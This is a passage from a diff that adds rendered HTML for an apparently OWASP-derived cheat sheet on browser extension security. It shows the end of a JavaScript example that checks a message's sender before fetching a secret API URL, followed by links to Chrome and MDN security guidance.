+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">sender</span><span class="p">.</span><span class="nx">url</span><span class="o">?</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">'chrome-extension://'</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">action</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'fetchSecret'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">SECRET_API_URL</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://developer.chrome.com/docs/extensions/mv3/security/">Chrome Extensions: Stay Secure</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices">MDN: WebExtension Security Best Practices</a></li>
+</ul></article></main><aside class="page-outline" aria-label="On this page"><p class="eyebrow">On this page</p><nav id="page-toc"></nav></aside></div>
+<footer class="site-footer"><span>Raw2Crawl · Security documentation</span><span>Cheat Sheet Series © OWASP Foundation &amp; contributors · <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> · <a href="https://github.com/OWASP/CheatSheetSeries">Source</a></span></footer>
+</body></html>
